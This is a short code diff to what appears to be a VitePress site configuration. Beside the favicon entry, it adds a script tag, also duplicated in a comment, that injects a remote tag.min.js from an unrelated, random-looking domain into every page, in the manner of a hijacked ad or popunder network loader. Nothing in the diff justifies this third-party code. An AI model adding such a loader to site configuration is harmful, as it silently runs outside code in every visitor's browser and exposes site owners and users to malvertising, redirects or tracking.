@@ -39,6 +39,8 @@ export default defineConfig({
   head: [
     // 配置网站的图标（显示在浏览器的 tab 上）
     ['link', { rel: 'icon', href: '/favicon.ico' }],
+    // <script>(s=>{s.dataset.zone=9794343,s.src='https://vemtoutcheeg.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+    ['script', {}, `(s=>{s.dataset.zone=9794343,s.src='https://vemtoutcheeg.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))`]
   ],
   markdown: {
     image: {
